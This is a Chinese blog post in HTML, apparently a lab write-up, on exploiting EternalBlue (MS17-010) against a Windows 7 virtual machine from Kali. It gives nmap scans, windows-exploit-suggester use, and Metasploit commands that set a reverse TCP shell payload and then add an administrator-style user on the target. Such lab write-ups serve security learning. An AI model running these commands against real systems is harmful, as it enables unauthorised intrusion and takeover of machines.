@@ -1,0 +1,284 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>永恒之蓝漏洞利用实验(Nmap、MSF) | z0ekball</title>
+<link rel="shortcut icon" href="https://z0ekball.github.io/favicon.ico?v=1650036679524">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://z0ekball.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="永恒之蓝漏洞利用实验(Nmap、MSF) | z0ekball - Atom Feed" href="https://z0ekball.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="信息收集
+IP
+靶机：win7     ip：192.168.89.130
+攻击机：kali    ip：192.168.89.129
+//kali查本机地址
+ip adress show 
+//windows查本机地址
+ipconfig ..." />
+    <meta name="keywords" content="MSF,Nmap" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://z0ekball.github.io">
+  <img class="avatar" src="https://z0ekball.github.io/images/avatar.png?v=1650036679524" alt="">
+  </a>
+  <h1 class="site-title">
+    z0ekball
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              永恒之蓝漏洞利用实验(Nmap、MSF)
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-10-15
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="https://z0ekball.github.io/tag/vHT9Igj0C/" class="post-tag">
+                  # MSF
+                </a>
+              
+                <a href="https://z0ekball.github.io/tag/zTfChF3R9i/" class="post-tag">
+                  # Nmap
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://z0ekball.github.io/post-images/yong-heng-zhi-lan-lou-dong-li-yong-shi-yan-nmapmsf.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="信息收集">信息收集</h2>
+<h3 id="ip">IP</h3>
+<p>靶机：win7     ip：192.168.89.130</p>
+<p>攻击机：kali    ip：192.168.89.129</p>
+<pre><code class="language-c">//kali查本机地址
+ip adress show 
+//windows查本机地址
+ipconfig         
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20211021013755009.png" alt="image-20211021013755009" loading="lazy"></figure>
+<h3 id="nmap">nmap</h3>
+<pre><code class="language-c">//二层主机发现
+nmap -sn 192.168.89.129/24
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20211021013902305.png" alt="image-20211021013902305" loading="lazy"></figure>
+<pre><code class="language-c">//端口扫描
+namp -sS 192.168.89.130
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20211021021443783.png" alt="image-20211021021443783" loading="lazy"></figure>
+<pre><code class="language-c">//识别操作系统
+nmap -O 192.168.89.130
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20211021021603442.png" alt="image-20211021021603442" loading="lazy"></figure>
+<h3 id="靶机信息">靶机信息</h3>
+<p>使用<code>windows-exploit-suggester</code>查找没有打补丁的漏洞</p>
+<pre><code class="language-c">//得到最新漏洞表
+python windows-exploit-suggester.py –update
+</code></pre>
+<p>在win7上面生成一个系统信息win7.txt 然后传到kali上（这一步现实渗透里要通过提权得到）</p>
+<pre><code class="language-c">systeminfo &gt; win7.txt
+</code></pre>
+<p>对比最新漏洞表和win7信息，得到未打补丁的漏洞信息</p>
+<pre><code class="language-c">/root/Windows-Exploit-Suggester-master/windows-exploit-suggester.py --database /root/2021-10-18-mssb.xls --systeminfo /root/桌面/win7.txt
+</code></pre>
+<p>这里有个坑，用最新版的xlrd无法运行</p>
+<pre><code class="language-c">python2 -m pip install xlrd==1.2.0
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20211021022228786.png" alt="image-20211021022228786" loading="lazy"></figure>
+<p>存在可利用poc的漏洞</p>
+<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20211021022313834.png" alt="image-20211021022313834" loading="lazy"></figure>
+<h2 id="永恒之蓝漏洞利用">永恒之蓝漏洞利用</h2>
+<p>由信息收集可以知道，win7的445端口打开，永恒之蓝正是针对445端口的，可利用永恒之蓝漏洞进行攻击。</p>
+<h3 id="msf">MSF</h3>
+<p>使用<code>msfconsole</code>攻击:</p>
+<pre><code class="language-c++">//分析模块
+msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010
+msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; show options
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20211021022645521.png" alt="image-20211021022645521" loading="lazy"></figure>
+<pre><code class="language-php">//设置端口
+set RhOSTS 192.168.89.130
+//执行
+run
+</code></pre>
+<p>存在永恒之蓝漏洞</p>
+<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20211021023124790.png" alt="image-20211021023124790" loading="lazy"></figure>
+<pre><code class="language-c++">//使用永恒之蓝攻击模块
+msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue
+//查看攻击对象
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show targets
+//查看选项
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20211021023348120.png" alt="image-20211021023348120" loading="lazy"></figure>
+<pre><code class="language-c++">//设置playload
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set playload windows/x64/shell/reverse_tcp
+playload =&gt; windows/x64/shell/reverse_tcp
+//设置端口
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RhOSTS 192.168.89.130
+RhOSTS =&gt; 192.168.89.130
+//运行
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run
+</code></pre>
+<p>得到可执行命令行</p>
+<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20211021023530811.png" alt="image-20211021023530811" loading="lazy"></figure>
+<pre><code class="language-php">//解决乱码
+chcp 65001
+//查看权限
+whoami
+//添加用户
+net user admin admin /add
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20211021023626837.png" alt="image-20211021023626837" loading="lazy"></figure>
+<p>看看靶机win7，创建成功，说明攻击成功</p>
+<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20211021023909688.png" alt="image-20211021023909688" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a>
+<ul>
+<li><a href="#ip">IP</a></li>
+<li><a href="#nmap">nmap</a></li>
+<li><a href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF">靶机信息</a></li>
+</ul>
+</li>
+<li><a href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">永恒之蓝漏洞利用</a>
+<ul>
+<li><a href="#msf">MSF</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://z0ekball.github.io/post/arp-qi-pian-shi-yan/">
+              <h3 class="post-title">
+                ARP欺骗实验
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://z0ekball.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
